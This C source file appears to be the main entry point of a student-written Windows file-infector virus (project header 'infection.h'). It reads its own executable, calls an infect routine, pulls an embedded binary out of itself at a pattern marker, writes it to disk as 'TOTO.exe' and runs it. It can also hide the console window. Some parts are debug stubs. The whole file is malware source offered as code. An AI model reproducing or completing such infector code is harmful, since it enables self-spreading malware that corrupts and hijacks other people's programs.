/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jguyet <jguyet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/03/13 12:11:43 by jguyet            #+#    #+#             */
/*   Updated: 2017/03/13 12:15:42 by jguyet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infection.h"

#include <time.h>
/*
**	Hide and close the current terminal
*/
void				close_console()
{
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_MINIMIZE);
	ShowWindow(hWnd, SW_HIDE);
	FreeConsole();
}

/*
**	Start a new console and relink file descriptor 0, 1, 2
**	then resizing window 300x600 to position x(100) y(100) and disabling resizing
*/
void				start_debug_console()
{
	AllocConsole();
	freopen("CONIN$", "r", stdin);
	freopen("CONOUT$", "w", stdout);
	freopen("CONOUT$", "w", stderr);
	HWND hWnd = GetConsoleWindow();
	if (hWnd) {
		SetWindowPos(hWnd, 0, 100, 100, 600, 600, NO_FLAGS);
		SetWindowLong(hWnd, GWL_STYLE, GetWindowLong(hWnd, GWL_STYLE) &~ WS_SIZEBOX);
	}
}

/*
** Just in case a SEGV is knocking...
*/
void signal_handler(int signal)
{
	printf("Something went wrong, i'm dying... good bye\n");
	//exit (1);
}

char		*get_temp_directory(void)
{
	char	username[101];
	DWORD	username_len = 101;
	char	*tempDirectory = ft_strnew(1000);

	memset(username, '\0', 100);
	GetUserName(username, &username_len);
	asprintf(&tempDirectory, "%s%s%s%s", USER_ABSOLUTE, username, APPDATA_FILE, TEMP_PATH);
	//asprintf(&tempDirectory, ".\\");
	return (tempDirectory);
}

char		*get_temp_executable_path(char *executable_name)
{
	//char	*temp_path = get_temp_directory();

	return ft_dstrjoin("", "TOTO.exe", 0);
}

bool		run_process(char *path, char *infection_content, int infection_size, int argc, char **argv, char **env)
{
	int pattern_position = find_pattern(infection_content, infection_size);
	if (pattern_position == -1) {
		return (false);
	}
	char *binary = infection_content + pattern_position;
	int binary_len = infection_size - pattern_position;
	windows_file_create_contents_size(path, binary, binary_len);

	printf("execve : |%s|\n", path);
	_spawnvpe(_P_OVERLAY, path, (const char **)argv, (const char **)env);
	return (true);
}

/*
**	Main entry point
*/
int					main(int argc, char **argv, char **env)
{
	bool debug = true;
	setlocale(LC_CTYPE, "");
	signal(SIGSEGV, signal_handler);
	srand(time(NULL));
	if (debug == true) {
		start_debug_console();
	}
	//INFECTION
	char	*infection_content = NULL;
	int		infection_size = 0;

	if ((infection_size = windows_file_get_contents_size(&infection_content, argv[0])) <= 0)
		return (0);
	infect(argv[0], infection_content, infection_size);
	//RUNNING
	char *temp_path = get_temp_executable_path(argv[0]);
	bool running = run_process(temp_path, infection_content, infection_size, argc, argv, env);
	while (debug == true && 1);
	return (0);
}
